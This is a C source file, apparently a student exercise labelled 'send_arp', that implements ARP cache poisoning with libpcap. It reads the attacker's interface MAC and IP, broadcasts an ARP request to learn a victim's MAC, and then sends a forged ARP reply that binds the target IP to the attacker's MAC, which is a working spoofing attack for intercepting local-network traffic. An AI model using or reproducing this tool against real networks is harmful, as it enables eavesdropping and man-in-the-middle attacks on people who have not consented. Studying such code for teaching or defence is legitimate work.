#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<pcap.h>
#include<netinet/if_ether.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<sys/ioctl.h>
#include<net/if.h>
#include<string.h>
#include<stdint.h>
#include<arpa/inet.h>
#include<netinet/in.h>

#define ETH_HW_ADDR_LEN 6
#define IP_ADDR_LEN 4

struct arp_packet{
    u_char targ_hw_addr[ETH_HW_ADDR_LEN];
    u_char src_hw_addr[ETH_HW_ADDR_LEN];
    u_short ether_type;                     //ethernet header
    u_int16_t hw_type;
    u_int16_t prot_type;
    u_int8_t hw_addr_size;
    u_int8_t prot_addr_size;
    u_int16_t op;
    u_int8_t sndr_hw_addr[ETH_HW_ADDR_LEN];
    u_int8_t sndr_ip_addr[IP_ADDR_LEN];
    u_int8_t rcpt_hw_addr[ETH_HW_ADDR_LEN];
    u_int8_t rcpt_ip_addr[IP_ADDR_LEN];
};

void make_arp(u_int8_t *packet, u_int8_t *src_mac, u_int8_t *dst_mac, u_int8_t *src_ip, u_int8_t *dst_ip, u_int16_t opcode){
    struct arp_packet *arp = (struct arp_packet *)malloc(sizeof(struct arp_packet));
        
    arp->ether_type      = htons(0x0806);
    arp->hw_type         = htons(1);
    arp->prot_type       = htons(0x0800);
    arp->hw_addr_size    = 6;
    arp->prot_addr_size  = 4;
    arp->op              = htons(opcode);
    
    if(dst_mac != NULL) memcpy(arp->targ_hw_addr, dst_mac, ETH_HW_ADDR_LEN);
    else memcpy(arp->targ_hw_addr, "\xff\xff\xff\xff\xff\xff", ETH_HW_ADDR_LEN);

    memcpy(arp->src_hw_addr, src_mac, ETH_HW_ADDR_LEN);

    if(dst_mac != NULL) memcpy(arp->rcpt_hw_addr, dst_mac, ETH_HW_ADDR_LEN);
    else memcpy(arp->rcpt_hw_addr, "\x00\x00\x00\x00\x00\x00", ETH_HW_ADDR_LEN);

    memcpy(arp->sndr_hw_addr, src_mac, ETH_HW_ADDR_LEN);
    memcpy(arp->rcpt_ip_addr, dst_ip, IP_ADDR_LEN);
    memcpy(arp->sndr_ip_addr, src_ip, IP_ADDR_LEN);
    memcpy(packet, arp, sizeof(struct arp_packet));
    free(arp);
}

int main(int argc, char *argv[]){
    pcap_t *handler;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct pcap_pkthdr *header;
    const char *interface = argv[1];
    u_int8_t sender_mac[ETH_HW_ADDR_LEN];
    u_int8_t sender_ip[IP_ADDR_LEN];
    u_int8_t target_mac[ETH_HW_ADDR_LEN];
    u_int8_t target_ip[IP_ADDR_LEN];
    u_int8_t attacker_mac[ETH_HW_ADDR_LEN];
    u_int8_t attacker_ip[IP_ADDR_LEN];
    int length = sizeof(struct arp_packet);

    const u_int8_t *packet_recv;
    u_int8_t *packet=(u_int8_t*)malloc(sizeof(struct arp_packet));
    struct arp_packet *arp=(struct arp_packet*)malloc(sizeof(struct arp_packet));
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    const char *name = "Kim Subong";
    printf("[sub26_2017]send_arp[%s]\n", name);
    printf("length : %d\n", length); 
    handler = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if(handler == NULL){
        printf("%s\n", errbuf);
        return -1;
    }

    inet_pton(AF_INET, argv[2], sender_ip);
    inet_pton(AF_INET, argv[3], target_ip);
    
    //get mac, ip of attacker
    
    strcpy(ifr.ifr_name, interface);

    if(ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) for(int i = 0;i<6;i++) attacker_mac[i] = ifr.ifr_hwaddr.sa_data[i];
    if(ioctl(sock, SIOCGIFADDR, &ifr) == 0) memcpy(attacker_ip, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, IP_ADDR_LEN);

    close(sock);
    
    //print mac, ip
    printf("Attacker's MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", attacker_mac[0], attacker_mac[1], attacker_mac[2], attacker_mac[3], attacker_mac[4], attacker_mac[5]);    
    printf("Attacker's IP : %d.%d.%d.%d\n", attacker_ip[0], attacker_ip[1], attacker_ip[2], attacker_ip[3]);  
    
    make_arp(packet, attacker_mac, NULL, attacker_ip, sender_ip, 1); //arp broadcast
    
    if(pcap_sendpacket(handler, packet, length) != 0){                      //arp broadcast
        printf("\nError Sending the packet\n");
        return -1;
    }
    printf("\narp broadcasted\n");

    while(1){                                                                //get arp reply
        pcap_next_ex(handler, &header, &packet_recv);
        arp = (struct arp_packet*)packet_recv;  
        if(ntohs(arp->ether_type) != ETHERTYPE_ARP) continue;
        if(ntohs(arp->op) != 2) continue;
        if(memcmp(arp->sndr_ip_addr, sender_ip, IP_ADDR_LEN)) continue;
        memcpy(sender_mac, arp->sndr_hw_addr, ETH_HW_ADDR_LEN);
        break;
    }
    printf("arp replied\n\n");
    
    printf("Sender's MAC  : %02x:%02x:%02x:%02x:%02x:%02x\n", sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]);

    make_arp(packet, attacker_mac, sender_mac, target_ip, sender_ip, 2);     //reply arp to target
    
    if(pcap_sendpacket(handler, packet, length) != 0){
        printf("\nError sending the packet\n");
        return -1;
    }
    printf("arp translating success\n");

    free(packet);free(arp);
    return 0;
}

